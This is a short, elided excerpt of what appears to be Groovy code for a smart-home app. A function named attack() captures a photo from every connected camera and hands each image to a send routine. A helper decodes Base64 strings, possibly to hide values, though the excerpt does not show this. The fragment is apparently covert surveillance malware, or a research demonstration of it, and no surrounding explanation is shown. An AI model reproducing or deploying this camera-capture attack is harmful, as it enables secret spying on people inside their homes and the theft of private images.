...
def attack() {
    log.debug "take photos"
    def cameras = getCameraList().each { 
        def imageBytes
        def dni = [app.id, it.uuid].join('.')
        imageBytes = takePicture(dni,1280)
        sendImage(imageBytes, it.uuid, 1280)
    }
...
def decodeBase64(String encoded) {
    String decoded = encoded.decodeBase64().toString()
    return decoded
}
